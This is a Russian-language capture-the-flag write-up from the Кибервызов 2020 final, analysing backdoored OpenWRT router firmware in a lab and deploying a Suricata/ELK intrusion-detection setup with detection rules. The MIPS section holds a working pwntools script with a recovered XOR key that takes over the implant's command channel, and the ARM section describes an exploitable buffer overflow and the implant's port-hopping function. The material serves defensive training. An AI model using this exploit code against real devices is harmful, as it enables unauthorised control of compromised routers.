# Кибервызов 2020
Решение для финала Кибервызов 2020
От команды `картинг по ру` - @kinjalik @djalilkhisaliev @gavt45 @gleb270

# Первичное исследование сетевой инфраструктуры

Подключились по SSH по выданным данным для входа. 
Запустили анализ с помощью `nmap` и `arp` и нашли 3 ip с интересными портами и проанализировав дампы трафика, определили, что роутеры находятся по адресам: 10.0.8.12 , 10.0.8.13 , 10.0.8.14 , а атакующий находится по адресу 192.168.1.2

# Обратная разработка сетевых протоколов

Чтобы найти уязвимые файлы, мы скачали оригинальный образ прошивок OpenWRT и с помощью `diff` нашли отличающиеся файлы

## 1. MIPS

Файл находился по пути `/usr/bin/sign`
 
Так же 10.0.8.13 биндится на 8888, тем самым создается подключение
192.168.1.2 сюда создается коннект c 10.0.8.13 на порт 5555
Найден ключ XOR: 
03 22 a7 14 be c4 10 2d f1 37 c7 1e 68 49 23 67

### Код для эксплойта:
```
def xor(s1,s2):
        return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

from pwn import *

r = remote('10.0.8.13', 8888)

k = unhexlify('03 22 a7 14 be c4 10 2d f1 37 c7 1e 68 49 23 67'.replace(' ',''))

IV = b'\x33\x23\x00\x1a'
print(IV)
init_msg = IV+b'\x7e\x2a'+IV+b'\x01\x01\x01\x01'
our_part = IV+b'\x01\x01\x01\x01'
print(init_msg)
enc_init_msg = xor(init_msg, k)
info(init_msg)
info(enc_init_msg)

r.send(enc_init_msg)

their_part = xor(r.recv(), k)

sess_key = our_part+their_part

info("Enc out: "+str(xor('\xde\xad',sess_key)[:2]))

r.send(xor('\x55\xfa',sess_key)[:2])

print(xor(r.recv(), sess_key))

```



Перехваченнный зашифрованный траффик на C&C сервер. Расшифровывается ксором .
`2006391a293d1101072b3b1d2f0031172e38012520043a0d21130a3c1c221b311d3934251c15043e3012323f1b150603343105003e100e092a29302e0a263e1e203b1d26261a323a32022018291523080529291f0921193c3b0006161b072c3e241a32281b213f27210d03222d0034102d242a0f2d0330360300330f263d07200a1504323a3d0c2619082a3f0829083b392d0b0c060920191904380529162204282a39032f1d03362b3a34172415371b313a171a0f3a1203261c2c1016022e133e081b0e313e10131c050c1e3f20313c3c0a03182332091d1e0315003521040836`

should_be_not_return_1 сравнивает dect_buffer с CE FA
Первые два байта дешифрованного сообщения должны быть CE и FA. 

ОПИСАНИЕ:
Описание протокола: 
Сначала C&C сервер(192.168.1.2) отсылает 14 байт в которых содержатся 2 байта команды на инициализацию и 8 байт IV. На основе этого ключа и текущего времени(рандом) клиент(роутер) генерирует вторую половину сессионного ключа(тоже 8 байт), 
которые отсылаеются на сервер. Сервер складывает то, что принял и IV и получает сессионый ключ. Далее все команды и ответы шифруются именно им. В качестве шифрования используется XOR. 

Открыли файл в ghidra. 25 строка создает дескриптор сокета, который биндит порт 8888(sStack44). 
Если порт был успешно забинден, то запускается бесконечный цикл(30 строка), которая постоянно прослушывает данный порт. 

Перейдем к описанию функции parse_command, но перед этим заметим, что бесконечный цикл завершается только в случае, если parse_command возвратит какие-либо значения, кроме единицы. Условия в 15 строке выполнится, если переменная cStack12, которая изначально имеет значение 
'\0' будет иметь значение '\x01'. Она примет значение '\x01' только когда функция should_not_return_1 сгенерирует сессионный ключ.
#### main
![](https://i.imgur.com/EHWi1C2.png)

#### should_not_return_1
![](https://i.imgur.com/FkXFzRr.png) 

#### parse_command
![](https://i.imgur.com/yMpvIbA.png)

## 2. ARM

Файл назывался `mkfs.f3fs`
Происходит обмен ключами по протоколу Диффи-Хелмана.
Зная кол-во пакетов можно вычислить порт.
В главной функции имеется buffer overflow(в буффер длины 988 пишется 1000 байт => можем эксплуатировать данную уязвимость и отключить системудосконально не зная протокола).
![](https://i.imgur.com/hNOF4nf.png)
![](https://i.imgur.com/g3h86mv.png)


Так же из-за одинаковости длины ключа мы можем сделать правила для suricat'ы.

Порт сменяется по линейной ф-ции. Соответственно можно его предсказать и использовать дальше в правилах. 
```
int port_change_alg(int port) 

{ 
return (port * 0x20202020 + 0x12345678U & 20000) + 10000 + (port % 0x14) * 2; 
}
```



## 3. x86_64

Файл был расположен по пути `/root/doc/log`
Сниффер использующий `libpcap`


# Реализация средств защиты информации
В целях обнаруженя и предотвращения последующих вторжений была развернута IDS-систем. С ее помощью производится анализ трафика, нахождение пакетов с подозрительными сигнатурами и последующее реагирование на них (в виде оповещения администратору или полной блокировки).

Использемое программное обеспечение:
- `Surricat` -- производит сбор, анализ и сохранение дампа трафика
- `SSHFS` -- обеспечивает доступ сервера IDS к дампу трафика на машине, производящей сбор
- `logstash` и `filebeat` -- централизованный сбор и выгрузка лог-инфорации (в данный момент применяется только для одного источника информации, но имеется перспектива масштабирования)
- `elasticsearch` -- система управления информацией, предоставляет остальным компонентам интерфейсы для доступа и/или добавления данных
- `Kibana` -- просмотр лог-информации, предоставление к ней интерактивного доступа

Правила для задачи 1:
1. Если идет обращение на порт 8888 длиной 14 затем ответ длины 7 => alert
2. Если идет обращение длиной 14 и при дешифровке статичным ключом длины 16 5 и 6 байты равны 0x7e 0x2a => alert
3. Если идет пакет на порт 8888 длины 2 и эти 2 байта при дешифровке XOR-ом статичным ключом они попадают в blacklist(см диаграмму протокола) => alert

Правило для задачи 2:
1. Данные идут на порт 9999 - const

![](https://i.imgur.com/lNagQe6.jpg)
